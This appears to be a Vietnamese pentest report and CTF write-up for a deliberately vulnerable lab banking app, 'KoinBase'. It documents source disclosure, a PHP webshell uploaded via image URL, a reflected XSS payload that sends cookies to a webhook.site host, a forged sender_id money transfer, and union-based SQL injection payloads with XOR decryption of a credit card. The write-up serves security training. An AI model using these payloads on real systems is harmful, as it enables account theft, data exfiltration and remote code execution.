# 1. Tổng quan
## Mô tả:
- Báo cáo nay mô tả chi tiết quá trình và kết quả kiểm thử ứng dụng KoinBase vào ngày 06, 07 tháng 05 năm 2023.
- Quá trình kiểm thử được thực hiện dưới hình thức graybox testing.
## Đối tượng:
- Ứng dụng Koinbase là ứng dụng lưu trữ và thực hiện chuyển tiền giữa các người dùng khác nhau. 
	- Bên cạnh đó ứng dụng cũng cung cấp một số chức năng phụ như: thống kê tiền người dùng, chỉnh sửa thông tin người dùng,...
# 2. Lỗ hổng
## 2.1. KoBe-01-001: Source code disclosure at https://upload.koinbase-53c1041dd203e.cyberjutsu-lab.tech/ due to misconfiguration [High]
### 2.1.1. Description and Impact
- Ứng dụng tồn tại một subdomain là https://upload.koinbase-53c1041dd203e.cyberjutsu-lab.tech/. 
- Theo phỏng đoán ban đầu đây là server lưu trữ được người dùng upload lên
- Có thể do cấu hình sai, khi thực hiện kỹ thuật Directory Scan phát hiện ra đường dẫn tới file ./robots.txt và thành công tìm được đường dẫn tới source code
- Việc để lộ mã nguồn của ứng dụng được coi như một miếng mồi béo bở đối với kẻ tấn công khi nhờ vào chúng, attacker có thể dễ dàng nắm bắt được các cơ chế hoạt động của các chức năng trong hệ thống . Đồng thời phát hiện ra các dữ liệu nhạy cảm như: password admin, password database, các cấu hình của hệ thống,... Làm bàn đạp để tấn công tới các chức năng thông qua nhưng lỗ hổng khác nhau.
### 2.1.2. Root Cause Analysis
- Nguyên nhân chính là do việc đưa source code lên server hệ thống và public đường dẫn chứa source code
### 2.1.3. Steps to reproduce
1. Sử dụng **ffuf** thực hiện scan đường dẫn https://upload.koinbase-53c1041dd203e.cyberjutsu-lab.tech/
	![](Pasted%20image%2020230509064406.png)
1. Phát hiện file `./robots.txt` có status 200. Truy cập tới file này, thấy nội dung file như sau
	![](Pasted%20image%2020230509062124.png)
2. Tiếp tục truy cập vào đường dẫn `./backup.zip` ta tải về 1 file zip, giải nén ta được mã nguồn của ứng dụng.
3. Từ mã nguồn ta đọc được Flag1
	![](Pasted%20image%2020230509062608.png)
> [!FLAG 1]
> CBJS{do_you_use_a_good_wordlist?}

### 2.1.4. Recommendations
- Không đưa mã nguồn lên server dịch vụ.
- Trong trường hợp bắt buộc phải đưa mã nguồn lên, vần đảm bảo không public đường dẫn chữa mã nguồn đó.
### 2.1.5. References
- [Source code disclosure - PortSwigger](https://portswigger.net/kb/issues/006000b0_source-code-disclosure)

---

## 2.2. KoBe-01-002: File Upload through url image lead to Remote Code Execution [Critical]
### 2.2.1. Description and Impact
- Chức năng thay đổi avatar thông qua địa chỉ url.
	![](Pasted%20image%2020230509063300.png)
- Trong chức năng này, hệ thống nhận địa chỉ url từ người dùng đưa vào để lấy upload nội dung ảnh và lưu thành avatar của người dùng.
- Truy nhiên trong quá trình upload ảnh thống qua url, do không được kiểm tra kỹ dẫn tới xuất hiện lỗ hổng nghiêm trọng có thể bị attacker RCE hệ thống
### 2.2.2. Root Cause Analysis
- Tính năng upload ảnh của trang https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/profile.php nhận image url từ người dùng. Sau đó thực hiện nhiệm vụ đọc nội dung file có trong url (`/cdn/src/index.php` từ dòng 26 -> 45)
	![](Pasted%20image%2020230509064234.png)
- Hệ thống cũng thực hiện kiểm tra nội dung url gửi lên có phải ảnh không thông qua hàm `IsImage()` bằng cách check `MIME_TYPE` (`/cdn/src/index.php` từ dòng 13 -> 23)
	![](Pasted%20image%2020230509064553.png)
- Tuy nhiên trong hàm `IsImage()` này, chương trình sử dụng hàm `finfo_file()` kiểm tra loại file bằng cách tìm kiếm chuỗi **magic bytes** tại một số vị trí nhất định trong file.[1]
- Dựa vào điều này, attacker có thể tấn công bằng cách thêm chuối magic bytes vào file upload để có thể giả mạo loại file. [2]
### 2.2.3. Steps to reproduce
1. Tạo một file `w1ll14m.php` chứa webshell của php
	![](Pasted%20image%2020230509065701.png)
2. Để có thể tạo ra url để hệ thống có thể truy cập đến file này, ta sẽ tạo một public repo trên github
	![](Pasted%20image%2020230509065835.png)
3. Lúc này, đường dẫn tới file `w1ll14m.php` có định dạng như sau
	`https://raw.githubusercontent.com/williamdunbar/FinalWPT/master/w1ll14m.php`
4. Đưa địa chỉ lên url này lên upload avatar
	![](Pasted%20image%2020230509070515.png)
5. Sử dụng burpsuit là phát hiện file ảnh được lưu vào đường dẫn sau: `upload/23aa1e9b1298a591.php`
	![](Pasted%20image%2020230509070739.png)
6. Truy cập đường dẫn https://upload.koinbase-53c1041dd203e.cyberjutsu-lab.tech/upload/23aa1e9b1298a591.php?cmd=id. Ta có thể RCE hệ thống
	![](Pasted%20image%2020230509070905.png)
7. Thực hiện đọc file `/secret.txt` ta được FLAG 2
https://upload.koinbase-53c1041dd203e.cyberjutsu-lab.tech/upload/23aa1e9b1298a591.php?cmd=cat%20/secret.txt
![](Pasted%20image%2020230509071043.png)

> [!FLAG 2]
> CBJS{y0u_rce_me_or_you_went_in_another_way?}

### 2.2.4. Recommendations

### 2.2.5. References
[1]  [PHP: Introduction - Manual](https://www.php.net/manual/en/intro.fileinfo.php)
[2]  [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

---

## 2.3. KoBe-01-003: XSS vulnerability leads to stealing other accounts' cookies [High]
### 2.3.1. Description and Impact
- Ứng dụng https://crush.cyberjutsu-lab.tech/ có đóng vai trò như một user ngây thơ thực hiện click bất kì URL nào được nhập vào trong text box 
	![](Pasted%20image%2020230509141208.png)
- Lợi dụng việc ngây thơ như vậy, attacker có thể thực hiện truyền các mã độc hại vào để lấy cookie của user Crush
### 2.3.2. Root Cause Analysis
- Xuất phát từ việc ta trigger được lỗi XSS onerror tại trang `https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/?page=1`
- Ta có thể lợi dụng tạo một lệnh fetch lấy docker.cookie đến 1 webhook rồi truyền địa chỉ trigger lỗi XSS đó đến cho con mèo click vô.
- Khi thành công, ta sẽ nhạn được 1 request đến webhook với cookie của con mèo (user crush).
- Từ đó đăng nhập vào Koinbase với tư cách user crush và lấy credit card.
### 2.3.3. Steps to reproduce
1. Đầu tiên ta trigger được lỗi XSS onerror như sau: `https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/?page=%3Cimg%20src=xss%20onerror=alert(document.cookie)%3E`
	![](Pasted%20image%2020230509142203.png)
2. Thay lệnh `alert` bằng 1.  `fetch("https://webhook.site/6bbefafb-8116-4a07-94bb-a320ebfec6c5/?content="%2bdocument.cookie)`
3. Truyền đường dẫn `https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/?page=%3Cimg%20src=xss%20onerror=fetch(%22https://webhook.site/6bbefafb-8116-4a07-94bb-a320ebfec6c5/?content=%22%2bdocument.cookie)%3E` cho con mèo ngây thơ click
4. Kiểm tra bên webhook ta thấy xuất hiện một request chứa cookie của con mèo
	![](Pasted%20image%2020230509142751.png)
5. Sử dụng BurpSuit truy cập vào https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/profile.php và thay địa chỉ cookie vừa tìm được
	![](Pasted%20image%2020230509142940.png)
=> Ta tìm được Flag3
> [!FLAG 3]
> CBJS{you_have_found_reflected_xss}

### 2.3.4. References
[Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

---

## 2.4. KoBe-01-004: Broken Access Control vulnerability in parameter during transfers between users [High]
### 2.4.1. Description and Impact
- Chức năng chuyển tiền cho ngươi dùng khác dựa vào id của người dùng đó
	https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/api/transaction.php?action=transfer_money
	![](Pasted%20image%2020230509080911.png)
- Dựa vào lỗ hổng Broken Access Control attacker có thể thay đổi `sender_id` dẫn đến việc đánh cắp tiền từ tài khoản người dùng khác
### 2.4.2. Root Cause Analysis
- Trong file `/koinbase/src/api/transaction.php` chức năng chuyển tiền, hệ thống bao gồm 3 tham số: `sender_id`, `receiver_id`, `amount`. 
	- Chương trình sẽ lấy thông tin từ `sender_id` và gửi tiền cho `receiver_id` với số tiền `amount` được người dùng chỉ định. 
	- Sau đó chương trình sẽ kiểm tra thông tin số dư của `sender_id` có đủ hay không và thực hiện chuyển tiền.
	![](Pasted%20image%2020230509082516.png)
	- Ở dòng 8 và 14, chương trình nhiện các tham số vào từ phương thức POST nhưng hoàn toàn không kiểm tra quyền truy cập nào, dẫn tới bất kỳ người dùng nào cũng có thể thay đổi id và ăn cắp tiền từ 1 user khác.
### 2.4.3. Steps to reproduce
1. Sử dụng BurpSuite bát gói tin api chuyển tiền của user. Chúng ta có thể thấy các tham số đang nằm ở data của request:
	![](Pasted%20image%2020230509082906.png)
2. Ta thấy người dùng **a** (có id=8 ) đang có nhiều tiền nhất. Ta sẽ thay đổi và xin nhẹ 9.999.999 từ anh **a**
	![](Pasted%20image%2020230509083043.png)
3. Chuyển gói tin vừa bắt được vào repeater. Đổi sender_id=8 và receiver_id=13 (id của attacker)
	![](Pasted%20image%2020230509083329.png)
	![](Pasted%20image%2020230509083351.png)
=> Ta tìm được Flag 4
> [!FLAG 4]
> CBJS{master_of_broken_access_control}

### 2.4.5. Recommendations
- Để sửa lỗ hổng này, chúng ta cần thêm một bước xác thực trong qua trình thực hiện API chuyển tiền
	https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/api/transaction.php?action=transfer_money
- Cụ thể, trong quá trình nhận tham số `sender_id` cần kiểm tra xem liệu `sender_id` có trùng với id của người dùng thực hiện gửi yêu cầu chuyển tiền đó không.
- Cách khác là ta có thể viết một module thực hiện tự lấy `sender_id` trùng với id người thực hiện gửi, như vậy tham số `sender_id` sẽ không xuất hiện trên gói tin post của `api/transaction.php?action=transfer_money` mà được gen tự động từ chương trình, nhờ đó làm giảm đi một attack surface.
### 2.4.6. References
- [Access control vulnerabilities and privilege escalation](https://portswigger.net/web-security/access-control#:~:text=Broken%20access%20control%20vulnerabilities%20exist,to%20be%20able%20to%20access.)

---

## 2.5. KoBe-01-005: Union-based SQL injection at `/view.php` on https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/ via `id` parameter [High]
### 2.5.1. Description and Impact
- Chức năng xem thông tin của từng người dùng trên trang `/view.php` thông qua `id` xuất hiện lỗ hổng SQLi Injection
	https://koinbase-53c1041dd203e.cyberjutsu-lab.tech/view.php?id=8
- Dựa vào lỗ hổng này, attacker có thể truy xuất tất cả dữ liệu trong hệ thống cơ sở dữ liệu.
### 2.5.2. Root Cause Analysis
- Chức năng hiển thị thông tin public của người dùng được thực hiện bởi API /api/user.php
	![](Pasted%20image%2020230509093932.png)
- Chức năng này nhận vào tham số `id` (dòng 9) và truyền xuống hàm `getInfoFromUserId()` để thực hiện các câu lệnh query để trả về thông tin cơ bản của người dùng
```php
function getInfoFromUserId($id) {
    return selectOne("SELECT id, username, money, image, enc_credit_card, bio FROM users WHERE id=" . $id . " LIMIT 1");
}
```
- Ta thấy giá trị `id` được truyền vào một câu lệnh SQL và id  truyền vào không bị kẹp trong bất kỳ cặp ký tự nào nên chúng ta không cần dùng ký tự đặc biệt nào để thoát khỏi strings.
- Từ đó attacekr có thể lợi dụng để truy xuất dữ liệu của hệ thống bằng UNION based SQL Injection
### 2.5.3. Steps to reproduce
#### Scenario 1: Đọc table Flag trong Database để lấy Flag5
1. Thông thường tham số `id` sẽ có dạng `id=8`. Khi kiểm tra với payload `id=-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6` response trả về có dạng
	![](Pasted%20image%2020230509095859.png)
2.  Như vậy ta có thể xác nhân API này bị dính lỗ hổng UNION-based SQL Injection. Tiếp tục thử với payload`id=-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7` thấy response trả về có dạng: 
	```json
	{"status_code":400,"message":"User not found"}
	```
3. Kết luận được table `users` có 6 cột, từ đây ta có thể lợi dụng để leak data.
4. Sử dụng Payload: `-1%20UNION%20ALL%20SELECT%20null%2c%20null%2c%20null%2c%20null%2c%20null%2c%20database()%20` nhằm trả về database mà chương trình đang làm việc:
	![](Pasted%20image%2020230509100951.png)
5. Phát hiện database có tên là “tonghop”, thực hiện truy vấn tìm tên các bảng trong database. Sử dụng payload: `-1%20UNION%20ALL%20SELECT%20null%2c%20null%2c%20null%2c%20null%2c%20null%2c%20group_concat(table_name)%20FROM%20%0d%0ainformation_schema.tables%20WHERE%20table_schema%20%3d%20%22tonghop%22%0d` 
	![](Pasted%20image%2020230509101153.png)
6. Tiếp tục tìm tên các cột trong bảng flag với Payload: `-1%20UNION%20SELECT%20null%2c%20null%2c%20null%2c%20null%2cnull%2c%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20%3d%20%22flag%22`
	![](Pasted%20image%2020230509101358.png)
7. Vậy trong database “tonghop” có table “flag” bao gồm comlumn “flag”. Dump flag này ra chúng ta sẽ có được flag. `-1%20UNION%20SELECT%20null%2c%20null%2c%20null%2c%20null%2c%20null%2c%20flag%20FROM%20flag%20--` 
	![](Pasted%20image%2020230509101533.png)
> [!FLAG 5]
> CBJS{integer_id_with_sqlinjection}

#### Scenario 2: Đọc Credit Card của user **Crush** để lấy Flag3
1. Lấy Credit Card của user Crush
```mysql
1+UNION+SELECT+NULL,enc_credit_card,NULL,NULL,NULL,NULL+FROM+users+WHERE+username="crush"+ORDER+BY+id+ASC+#
```
![](Pasted%20image%2020230509103220.png)
>dF4FVxZWDxVxcS4wSUwLTTsKWEBUalZYR1wAb0QAU1lXUBAGVmocSxcf

2. Ta nhận thấy trước khi credit card được hiển thị hoặc được lưu vào CSDL, nó được xử lý qua 1 hàm `xorString()` (dòng 27)
	![](Pasted%20image%2020230509102314.png)
3. Kiểm tra hàm `xorString()` ta thấy hàm này cần tham số key
	``` php
	function xorString($string, $key) {
	    for($i = 0; $i < strlen($string); $i++)
            $string[$i] = ($string[$i] ^ $key[$i % strlen($key)]);
    return $string;
    }
	```
4. Vì vậy bước tiếp theo chúng ta sẽ đi tìm `xorKey`. Tạo credit card của mình `codelyoko`
	![](Pasted%20image%2020230509130109.png)
5. Dump lại DB để lấy ra chuỗi Credit Card của mình đã được mã hóa
```mysql
1+UNION+SELECT+NULL,enc_credit_card,NULL,NULL,NULL,NULL+FROM+users+WHERE+id=13+ORDER+BY+id+ASC+#
```
![](Pasted%20image%2020230509130126.png)
>AwBXBANTAg0LA1VRAQFRDlNaAAYABwMDBwRTCA9VBAcBB1FVBQ1dCFVQCgIEAwcPCwJVAgVRAAMFC11T.
6. Tiến hanh Xor 2 chuỗi plaintext và base64_decode(ciphertext) ta được key `22d06e5523dc25d8db96150722d06e5523dc25d8db96150722d06e5523dc2`
7. Tìm plaintext của Credit card ta được Flag5
```php
<?php
    function xorString($string, $key) {
        for($i = 0; $i < strlen($string); $i++) 
            $string[$i] = ($string[$i] ^ $key[$i % strlen($key)]);
        return $string;
    }
$a = base64_decode("dF4FVxZWDxVxcS4wSUwLTTsKWEBUalZYR1wAb0QAU1lXUBAGVmocSxcf");
$b = xorString($a,"22d06e5523dc25d8db96150722d06e5523dc25d8db96150722d06e5523dc2");
echo $b;
?>
```

> [!FLAG 3]
>  CBJS{you_have_found_reflected_xss}

### 2.5.4. Recommendations
- Black list các ký tự đặc biệt thường dùng trong SQLi
- Không cộng chuỗi để tạo câu lệnh SQL
### 2.5.5. References
- [What is SQL Injection? Tutorial & Examples | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/sql-injection#:~:text=SQL%20injection%20(SQLi)%20is%20a,not%20normally%20able%20to%20retrieve.)

